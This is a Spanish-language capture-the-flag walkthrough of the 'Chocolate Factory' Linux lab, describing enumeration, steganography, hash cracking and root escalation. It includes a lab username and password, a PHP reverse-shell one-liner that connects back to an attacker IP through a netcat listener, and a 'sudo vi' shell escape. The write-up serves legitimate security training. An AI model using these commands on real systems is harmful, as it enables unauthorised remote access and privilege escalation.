# Chocolate Factory

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux combinando técnicas de enumeración avanzada, extracción de información oculta mediante esteganografía, obtención de credenciales, explotación de una vulnerabilidad de **Remote Command Execution (RCE)** y escalada de privilegios mediante una mala configuración de **sudo** sobre el binario `vi`.

---

## 🛠️ Tecnologías trabajadas

- FTP
- SSH
- HTTP
- Steghide
- Strings
- Base64
- John The Ripper
- PHP Reverse Shell
- Sudo
- GTFOBins
- Vi

---

## 🧠 Metodología

La enumeración inicial reveló los servicios habituales (FTP, SSH y HTTP), pero también varios puertos poco comunes abiertos. En lugar de centrarme únicamente en los servicios tradicionales, decidí investigar esos puertos adicionales, ya que en muchos laboratorios contienen pistas necesarias para continuar la explotación.

Uno de esos servicios proporcionó la ubicación de un archivo que contenía información relevante. Paralelamente, el acceso anónimo al servidor FTP permitió descargar una imagen que, tras analizarla mediante técnicas de esteganografía, reveló nuevas credenciales ocultas.

Con las credenciales obtenidas accedí a la aplicación web, donde encontré una consola capaz de ejecutar comandos directamente sobre el sistema, proporcionando una vía clara para obtener una **reverse shell**.

Finalmente, la enumeración de privilegios mostró que el usuario podía ejecutar `vi` como **root** mediante `sudo`. Aprovechando una técnica documentada en **GTFOBins** fue posible escapar desde el editor hacia una shell privilegiada y completar la explotación.

Este laboratorio demuestra la importancia de realizar una enumeración exhaustiva y combinar distintas técnicas de análisis para avanzar en cada fase del compromiso.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo con **ReconX**, identificando los siguientes servicios:

| Puerto | Servicio |
|---------|----------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |
| 100-125 | Servicios adicionales |

La información más relevante fue:

- FTP permitía **Anonymous Login**.
- La aplicación web disponía de un formulario de autenticación.
- Existían varios servicios en puertos poco habituales que podían contener información útil.

---

### 2. Enumeración de servicios adicionales

Durante la revisión de los puertos comprendidos entre el **100 y el 125**, uno de ellos devolvió la siguiente referencia:

```text
http://10.129.143.183/key_rev_key
```

Descargué el archivo y comprobé su tipo.

```bash
file key_rev_key
```

Posteriormente extraje las cadenas legibles.

```bash
strings key_rev_key
```

Entre ellas apareció una cadena identificada como contraseña:

```text
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
```

Esta información sería utilizada durante las siguientes fases de la explotación.

---

### 3. Enumeración del servicio FTP

Accedí al servidor utilizando el acceso anónimo.

```bash
ftp anonymous@10.129.143.183
```

Dentro encontré la imagen:

```
gum_room.jpg
```

La descargué y analicé mediante **Steghide**.

```bash
steghide extract -sf gum_room.jpg
```

El proceso extrajo un nuevo archivo:

```
b64.txt
```

Visualicé su contenido.

```bash
cat b64.txt
```

El archivo contenía una cadena codificada en Base64.

La descodifiqué:

```bash
base64 -d b64.txt
```

El resultado era un hash correspondiente a la contraseña del usuario **charlie**.

Guardé el hash y utilicé **John The Ripper** para crackearlo.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

El resultado fue:

```
Usuario: charlie

Contraseña: cn7824
```

---

### 4. Obtención del acceso inicial

Con las credenciales obtenidas inicié sesión en la aplicación web del puerto 80.

Tras autenticarme apareció una consola capaz de ejecutar comandos directamente sobre el servidor, indicando una vulnerabilidad de **Remote Command Execution (RCE)**.

Preparé un listener.

```bash
nc -lvnp 8150
```

Posteriormente ejecuté una reverse shell desde la consola web.

```php
php -r '$sock=fsockopen("10.0.2.15",8150);exec("/bin/bash -i <&3 >&3 2>&3");'
```

La conexión se estableció correctamente y obtuve una shell sobre el sistema.

---

### 5. Post-explotación

Una vez dentro localicé la primera flag.

```bash
find / -name user.txt 2>/dev/null
```

Leí su contenido.

```bash
cat user.txt
```

---

### 6. Escalada de privilegios

El siguiente paso fue comprobar los permisos disponibles.

```bash
sudo -l
```

El resultado mostró:

```text
(root) NOPASSWD: /usr/bin/vi
```

Consultando **GTFOBins** confirmé que `vi` permite escapar hacia una shell cuando se ejecuta mediante `sudo`.

Ejecuté:

```bash
sudo vi -c ':!/bin/sh' /dev/null
```

Tras ello obtuve una shell con privilegios de **root**.

Comprobé el usuario actual.

```bash
whoami
```

Resultado:

```
root
```

Finalmente accedí al directorio del administrador.

```bash
cd /root
```

Encontré el archivo:

```
root.py
```

Lo ejecuté.

```bash
python root.py
```

Obteniendo la última flag

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación muy completa combinando técnicas de enumeración, análisis forense y escalada de privilegios.
- Enumerar servicios poco habituales y comprender su importancia durante un pentest.
- Utilizar `strings` para extraer información útil de archivos binarios.
- Aplicar técnicas de esteganografía mediante **Steghide**.
- Decodificar información en Base64 y crackear hashes utilizando **John The Ripper**.
- Aprovechar una consola vulnerable para obtener una **Remote Command Execution (RCE)**.
- Generar una **reverse shell** utilizando PHP.
- Enumerar privilegios mediante `sudo -l`.
- Utilizar **GTFOBins** para explotar el binario `vi`.

### Reflexión

La principal enseñanza de este laboratorio fue comprobar que una buena enumeración va mucho más allá de revisar únicamente los puertos habituales. La información crítica se encontraba distribuida entre varios servicios, una imagen con datos ocultos y distintos archivos que solo cobraban sentido al combinarse entre sí. Además, reforzó la importancia de dominar herramientas como **Steghide**, **John The Ripper** y **GTFOBins**, ya que cada una desempeñó un papel esencial en una cadena de explotación completa hasta obtener privilegios de **root**.
